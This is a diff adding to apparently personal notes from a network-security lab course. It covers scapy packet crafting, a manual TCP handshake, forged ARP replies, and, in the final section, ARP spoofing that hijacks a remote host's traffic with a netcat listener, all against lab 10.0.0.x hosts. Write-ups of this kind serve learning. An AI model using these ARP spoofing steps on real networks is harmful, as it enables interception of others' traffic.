@@ -118,3 +118,78 @@ nmap -v --open -T4 -sn 10.0.0.0/16
 ```
 
  This took 2572 seconds. Others solve in less than two minutes so there is a quicker way to scan. 🤔
+
+## Sending a custom packet to a remote host
+
+Using [scapy](https://scapy.readthedocs.io/en/latest/index.html),
+
+```python
+src_mac=get_if_hwaddr("eth0")
+
+pkt = Ether(type=0xFFFF, src=src_mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2", dst="10.0.0.3")/TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF")
+
+resp = sendp(pkt, iface="eth0", return_packets=True)
+```
+
+## TCP handshake
+
+Manually perform a Transmission Control Protocol handshake. The initial packet should have `TCP sport=31337, dport=31337, seq=31337`. The handshake should occur with the remote host at `10.0.0.3`.
+
+```python
+# Get the MAC address of the ethernet interface
+src_mac=get_if_hwaddr("eth0")
+
+# Send the SYN packet
+pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2", dst="10.0.0.3")/TCP(sport=31337, dport=31337, seq=31337, flags="S")
+resp = srp(pkt, iface="eth0")
+
+# View the response
+resp[0][0]
+```
+
+This displays the following,
+
+```txt
+QueryAnswer(
+  query=<Ether  dst=ff:ff:ff:ff:ff:ff src=26:c2:81:a8:58:02 type=IPv4 |<IP  frag=0 proto=tcp src=10.0.0.2 dst=10.0.0.3 |<TCP  sport=31337 dport=31337 seq=31337 flags=S |>>>,
+  answer=<Ether  dst=26:c2:81:a8:58:02 src=42:a8:e3:7b:b2:87 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=40 id=1 flags= frag=0 ttl=64 proto=tcp chksum=0x66cb src=10.0.0.3 dst=10.0.0.2 |<TCP  sport=31337 dport=31337 seq=2120348149 ack=31338 dataofs=5 reserved=0 flags=SA window=8192 chksum=0x9c39 urgptr=0 |>>>
+)
+```
+
+Pull the `src=42:a8:e3:7b:b2:87` to use as the `dst` in the next `Ether` packet. Also pull `seq=2120348149` and `ack=31338` out of the response. We set our `ack` field to one plus their `seq` and our `seq` equal to their `ack`
+
+```python
+# Send the ACK Packet
+pkt = Ether(src=src_mac, dst="42:a8:e3:7b:b2:87")/IP(src="10.0.0.2", dst="10.0.0.3")/TCP(sport=31337, dport=31337, seq=31338, ack=2120348150, flags="A")
+sendp(pkt, iface="eth0")
+```
+
+## Send ARP packet
+
+Manually send an Address Resolution Protocol packet. The packet should have `ARP op=is-at` and correctly inform the remote host of where the sender can be found. The packet should be sent to the remote host at `10.0.0.3`.
+
+```python
+sendp(Ether(src="26:0e:62:c0:25:8e", dst="ff:ff:ff:ff:ff:ff")/ARP(psrc="10.0.0.2", hwsrc="26:0e:62:c0:25:8e", op="is-at"), iface="eth0")
+```
+
+## Hijack traffic from a remote host using ARP
+
+Hijack traffic from a remote host using ARP. You do not have the capabilities of a NET ADMIN. The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.2` on port `31337`.
+
+First, set the IP address to that of the target machine,
+
+```sh
+ifconfig eth0 10.0.0.2 netmask 255.255.0.0
+```
+
+Then in `scapy`, send an ARP packet telling 10.0.0.4 that my machine is now 10.0.0.2 (same as previous level),
+
+```python
+sendp(Ether(src="26:0e:62:c0:25:8e", dst="ff:ff:ff:ff:ff:ff")/ARP(psrc="10.0.0.2", hwsrc="26:0e:62:c0:25:8e", op="is-at"), iface="eth0")
+```
+
+Finally, use netcat to listen on the port,
+
+```sh
+nc -l 31337
+```
